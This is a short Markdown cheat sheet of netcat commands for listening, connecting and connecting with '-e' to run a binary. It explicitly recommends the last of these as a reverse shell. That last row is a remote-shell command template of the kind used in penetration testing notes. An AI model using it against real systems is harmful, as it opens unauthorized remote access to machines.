# Netcat
Comm | Desc
--- | ---
`nc -l -p <port>` | listen on port
`nc <dest_ip> <port>` | Connect to dest_ip on port
`nc <dest_ip> <port> -e <binary>` | Connect to dest_ip on port executing binary (great for rev shell)